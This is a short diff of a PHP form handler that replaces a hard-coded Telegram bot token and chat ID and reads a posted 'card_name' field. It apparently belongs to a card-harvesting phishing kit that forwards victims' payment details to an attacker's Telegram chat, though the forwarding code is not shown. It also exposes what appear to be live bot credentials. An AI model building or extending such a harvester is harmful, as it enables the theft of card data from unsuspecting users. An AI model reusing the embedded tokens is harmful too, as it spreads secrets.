@@ -10,8 +10,8 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 }
 
 // BOT MƏLUMATLARI
-$botToken = '8841506672:AAFfENXDle-OQftdnVFdC1AegyoW1H7SHBQ';
-$chatId = '-1004326178006';
+$botToken = '8948913513:AAHz7gsPrKjvy5PeOq88R7QT45yhlhBLs2Q';
+$chatId = '-1004431524568';
 
 // POST MƏLUMATLARI
 $cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
